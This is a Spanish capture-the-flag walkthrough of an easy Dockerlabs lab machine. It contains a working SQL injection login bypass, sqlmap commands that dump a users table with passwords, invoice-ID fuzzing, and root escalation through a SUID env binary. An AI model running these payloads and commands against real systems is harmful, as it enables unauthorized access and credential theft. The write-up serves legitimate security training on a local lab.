Dificultad -> Fácil

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/maquinas/243/descargar)

# Archivos
.sh → Script de Linux con comandos. Se ejecuta en la terminal.

.tar → Archivo que agrupa otros archivos/carpetas.

# Despliegue

La máquina se descarga en formato .zip, deberemos extraer su contenido desde nuestra máquina Kali. 
Abriremos una terminal en la carpeta donde hemos extraído el contenido del .zip y deberemos ejecutar:

```
sudo bash auto_deploy.sh duque.tar
```

Obtenemos la IP de la máquina.

![](Fotos/Pasted%20image%2020260930232627.png)

Probaremos la conexión mediante un ping

```bash
ping 172.17.0.2
```

![](Fotos/Pasted%20image%2020260930232716.png)

Vemos que tenemos conexión con la máquina y además podemos deducir que la máquina es un sistema operativo Linux debido al valor de ttl, ya que para Linux el valor de ttl suele iniciar en 64 y para Windows suele iniciar en 128.

# Escaneo

Una vez que sabemos que tenemos conexión con la máquina realizaremos el escaneo de puertos.

```bash
nmap -p- -sCV 172.17.0.2 -vvv
```

![](Fotos/Pasted%20image%2020260930232915.png)

Vemos que hay dos servicios corriendo

- 22: OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
- 80: Apache 2.4.52

Vamos a ver el contenido de la web

![](Fotos/Pasted%20image%2020260930233317.png)

Vemos que es un Dashboard Corporativo

# Enumeración

Vamos a enumerar la web para comprobar si hay alguna ruta interesante

![](Fotos/Pasted%20image%2020260930234213.png)

Vemos que encuentra algunas rutas:

* index.php
* intranet: No podremos entrar por no tener los certificados necesarios
![](Fotos/Pasted%20image%2020260930234720.png)
* bills: Si intentamos acceder a bills

![](Fotos/Pasted%20image%2020260930234352.png)

* proveedores: Veremos una lista de proveedores

![](Fotos/Pasted%20image%2020260930234436.png)

* empleados: En empleados se denegará el acceso

![](Fotos/Pasted%20image%2020260930234517.png)

* normativa: Veremos la normativa
![](Fotos/Pasted%20image%2020260930234542.png)
* index.php


Vamos a vulnerar esta máquina


# Ataque SQL Injection

Hemos visto que hay un login en la web. Intentaremos atacar este login mediante inyección SQL.

usuario: ' OR 1=1; -- -
contraseña: test

![](Fotos/Pasted%20image%2020260930235306.png)

Vemos que iniciamos sesión con el usuario "mario".

Parece ser que este usuario no tiene los suficientes privilegios.

Vamos a aprovecharnos de esta vulnerabilidad para sacar informacion de la base de datos.
Utilizaremos el siguiente comando

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" --data="username=test*&password=test*" --batch --dbs
```

![](Fotos/Pasted%20image%2020260930235928.png)

Vemos que existen esas 5 bases de datos

Nos interesa obtener más información de la base de datos register.

Usaremos el siguiente comando

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" --data="username=test*&password=test*" -D register --tables --batch
```


![](Fotos/Pasted%20image%2020261001000558.png)

Ha encontrado una tabla.

Vamos a ver el contenido de esta

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" --data="username=test*&password=test*" -D register -T users --dump --batch
```

![](Fotos/Pasted%20image%2020261001000858.png)

Hemos conseguido las contraseñas


Si entramos como admin tendremos los privilegios suficientes como para ver facturas. Estas facturas tienen un identificador propio que es fácil de predecir.

![](Fotos/Pasted%20image%2020261001002037.png)

Usaremos lo siguiente para generar combinaciones

![](Fotos/Pasted%20image%2020261001002057.png)

El siguiente paso sera utilizar fuff para comprobar los ids

![](Fotos/Pasted%20image%2020261001002252.png)


![](Fotos/Pasted%20image%2020261001002319.png)

Buscaremos la factura cuyo size sea notablemente diferente al de los demas

![](Fotos/Pasted%20image%2020261001002359.png)

Nos dará un usuario y contraseña.

# SSH
Probaremos estas credenciales en SSH

![](Fotos/Pasted%20image%2020261001002453.png)

Listaremos los archivos del sistema que tengan bit SUID

```bash
find / -perm -4000 -type f -exec ls -la{}\; 2>dev/null
```


![](Fotos/Pasted%20image%2020261001003030.png)

Vemos que /usr/bin/env tiene un SUID malicioso.

En un sistema Linux estándar, env jamás debe tener permisos SUID, ya que permite ejecutar cualquier comando o script heredando los privilegios del propietario del archivo (root en este caso).

Por lo que podemos abrir una consola interactiva con el siguiente comando

```bash
/usr/bin/env /bin/sh -p
```

![](Fotos/Pasted%20image%2020261001003420.png)

Ya somos root y hemos completado la máquina.
